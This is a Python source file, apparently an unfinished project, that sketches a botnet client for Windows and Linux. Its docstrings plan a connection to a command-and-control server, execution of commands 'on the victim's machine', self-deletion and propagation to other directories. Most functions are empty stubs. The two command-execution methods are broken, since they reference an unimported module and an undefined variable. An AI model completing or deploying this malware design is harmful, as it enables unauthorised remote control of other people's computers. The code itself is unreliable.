#!/usr/bin/env python3

"""
AUTHORS: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
START DATE: 2020-04-06
END DATE: 2020-04
MODULE NAME: ______
"""

try:
    import socket 						# import socket for creating TCP connection.
    from subprocess import PIPE, run	# import subprocess to execute system commands.
    from os import devnull				# import devnull from os to send stderr to devnull.
    from sys import exit				# import exit from sys to quit program when specified.
except Exception:
    exit(1)
    
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

FILENAME = __file__[2:]

def create_client_socket(ip_addr: str, port: int):
	"""This function creates a client socket to connect to 
		our command & control server.

		Arguments:
			ip_addr (str): The IP address of our C&C server.
			port (int): The port number of the C&C server to connect to.
		
		Returns:
			This function Will return a socket object.
	"""
	pass

def self_delete(name: str):
    """This function will be invoked when the C&C server enter's the
		keyword "self-destruct" and which will instruct the program to
		delete traces of itself.

		Arguments:
			name (str): The name of this file.
		
		Returns:
			None

	"""
	pass
	
def propagate(name: str):
	"""This function will create other instances of this file in 
		other directories on the victim's machines when the keyword
		"propogate" is used.

		Arguments:
			name (str): The name of this file.

		Returns:
			None
	"""
    pass

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class WindowsBot:
	"""This class definition will contain the functions and commands
		that are specific to the Windows operating system.
	"""
	def __init__(self):
        pass
    
	def exec_windows_cmd(self, commnd: str):
		"""This function will execute Windows commands requested by the C&C.
			
			Argments:
				command (str): The command that will be executed on the victim's machine.
			
			Returns:
				Will return the output of the command that was executed.
		"""
		DEVNULL = open(devnull, 'w')
		output = subprocess.run(cmd,
								shell=True, 
								stdout=PIPE, 
								stderr=DEVNULL)
		return output

	def handle_request(self):
		"""
		"""
		pass
		
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class LinuxBot:
	"""This class definition will contain the functions and commands
		that are specific to the Linux operating system.
	"""
	def __init__(self):
	    pass

	def exec_linux_cmd(self, commnd: str):
		"""This function will execute Linux commands requested by the C&C.
			
			Argments:
				command (str): The command that will be executed on the victim's machine.
			
			Returns:
				Will return the output of the command that was executed.
		"""
		DEVNULL = open(devnull, 'w')
		output = subprocess.run(cmd,
								shell=True, 
								stdout=PIPE, 
								stderr=DEVNULL)
		return output

	def handle_request(self):
		"""
		"""
		pass

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def main():
    pass

if __name__ == '__main__':
    main()
